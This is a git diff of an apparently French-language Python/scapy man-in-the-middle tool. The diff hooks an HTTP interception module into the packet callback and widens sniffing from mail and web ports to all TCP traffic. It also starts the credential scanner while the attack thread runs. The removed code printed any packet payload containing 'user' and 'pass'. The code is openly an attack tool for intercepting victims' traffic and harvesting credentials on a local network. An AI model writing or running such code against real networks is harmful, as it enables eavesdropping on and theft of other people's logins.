@@ -6,17 +6,12 @@ from scapy.layers import  *
 from scapy.error import Scapy_Exception
 import os,sys,threading,signal
 
-from scapy.layers.inet import TCP, IP
+from scapy.layers.inet import TCP, IP, UDP
 from scapy.layers.l2 import *
+from protocols.Http  import  HttpMitm
 
 from  logger.colorizeStream import ColorizingStreamHandler
 import logging
-
-
-
-
-
-
 
 class MITM():
 
@@ -37,6 +32,7 @@ class MITM():
         self.ATTACK_INF["IMAP_SCAN"] = False
         self._is_running = False
         conf.verb = 0
+        self.http_pq = HttpMitm()
 
 
 # Color log
@@ -52,17 +48,19 @@ class MITM():
 
     def packet_callback(self,packet):
         # check to make sure it has a data payload
-        if packet[TCP].payload:
-            mail_packet = str(packet[TCP].payload)
-            if 'user' in mail_packet.lower() and 'pass' in mail_packet.lower():
-                print '[*] Server: %s' % packet[IP].dst
-                print '[*] %s' % packet[TCP].payload
-                print "=" * 75
-                packet.show()
+        #if packet[TCP].payload:
+         #   mail_packet = str(packet[TCP].payload)
+         #   if 'user' in mail_packet.lower() and 'pass' in mail_packet.lower():
+          #      print '[*] Server: %s' % packet[IP].dst
+           #     print '[*] %s' % packet[TCP].payload
+            #    print "=" * 75
+             #   packet.show()
+        if self.ATTACK_INF["HTTP_SCAN"]:
+            self.http_pq.analyse(packet)
 
 
     def run_authentifacion_scanner(self):
-        sniff(filter="tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80", prn=self.packet_callback, store=0)
+        sniff(filter="tcp ", prn=self.packet_callback, store=0)
 
     def right_argument(self,input):
         if  input == "o" or input == "O":
@@ -108,7 +106,7 @@ class MITM():
             if(iff == self.ATTACK_INF["IFACE"]):
                 self.ATTACK_INF["GW_IP"] = gw
             else:
-                logging.error("L'adresse ip de la Gateway est introuvable!!")
+                logging.error("L'adresse ip de la Gateway est introuvable, veuillez relancer le script en étant sur que l'interface réseau utilisée est bien active !!")
         except Exception:
             logging.error("Find Gateway fonction: "+Exception.message)
             sys.exit(1)
@@ -168,6 +166,7 @@ class MITM():
                                                                     self.ATTACK_INF["VM_IP"],self.ATTACK_INF["VM_MA"]))
         try:
             attack_thread.start()
+            self.run_authentifacion_scanner()
             scan = raw_input("Tapez Entrer pour arreter l'attaque : ")
             self.stop_attack()
             print "bjr"
